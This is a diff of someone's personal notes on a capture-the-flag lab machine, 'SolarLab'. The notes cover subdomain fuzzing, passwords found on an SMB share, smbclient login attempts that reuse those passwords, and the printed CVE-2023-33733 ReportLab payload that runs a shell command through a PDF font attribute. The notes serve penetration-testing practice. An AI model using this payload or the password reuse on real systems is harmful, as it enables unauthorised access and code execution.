@@ -36,6 +36,8 @@ Scan for vhost?
 
 ffuf -u http://solarlab.htb -H "Host: FUZZ.solarlab.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -fc 404 -t 40
 
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://solarlab.htb -H "Host: FUZZ.solarlab.htb" -c -v -t 50 -fs 169
+
 No vhost found.
 
 ffuf -u https://FUZZ.solarlab.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -v -c -t 40
@@ -72,3 +74,89 @@ smb: \> ls
   old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023
 
 Downloaded two file: details-file.xlsx old_leave_request_form.docx
+
+Open details-file.xlsx:
+
+Username	Password
+Alexander.knight@gmail.com	al;ksdhfewoiuh
+KAlexander	dkjafblkjadsfgl
+Alexander.knight@gmail.com	d398sadsknr390
+blake.byte	ThisCanB3typedeasily1@
+AlexanderK	danenacia9234n
+ClaudiaS	dadsfawe9dafkn
+
+
+smbclient //<target_ip>/<share_name> -U <username>
+smbclient //10.10.11.16/C -U KAlexander
+
+smbclient //<target_ip>/C$ -U username%password
+
+
+smbclient //10.10.11.16/C$ -U blake.byte%ThisCanB3typedeasily1@ Failed
+smbclient //10.10.11.16/C$ -U AlexanderK%danenacia9234n Failed
+smbclient //10.10.11.16/C$ -U ClaudiaS%dadsfawe9dafkn Failed
+smbclient //10.10.11.16/C$ -U KAlexander%dkjafblkjadsfgl Failed
+
+smbclient //10.10.11.16/C$ -U Alexander.knight@gmail.com Failed
+
+Need to scan all the ports:
+https://github.com/Tib3rius/AutoRecon
+
+With nmap
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+6791/tcp open  hnm
+
+Check port 6791
+
+PORT     STATE SERVICE VERSION
+6791/tcp open  http    nginx 1.24.0
+|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+|_http-server-header: nginx/1.24.0
+
+Add to `/etc/hosts`: 10.10.11.16 report.solarlab.htb
+
+![alt text](image.png)
+
+
+AlexanderK	danenacia9234n
+ClaudiaS	dadsfawe9dafkn
+
+2 user login failed with notification: user authentication error. Others failed with user not found.
+
+All credentials are not incorrect. But the format of username is "FirstL".
+
+Regconize Blake.byte is invalid, change it to BlakeB pass `ThisCanB3typedeasily1@`and successfully login to the report website.
+
+![alt text](image-1.png)
+
+![alt text](image-2.png)
+
+![alt text](image-3.png)
+
+![alt text](image-4.png)
+
+![alt text](image-5.png)
+
+All the subpage are same. Let check the button `Generate PDF`
+
+![alt text](image-6.png)
+
+It generate a PDF file. It insert my uploaded image to the PDF file.
+
+Search on Google: reporthub exploit and got this repo: https://github.com/c53elyas/CVE-2023-33733
+
+the payload
+```html
+<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
+                exploit
+</font></para>
+```
+
+See the color attribute -> edit the Justification to add the html tag.
+
+![alt text](image-7.png)
+
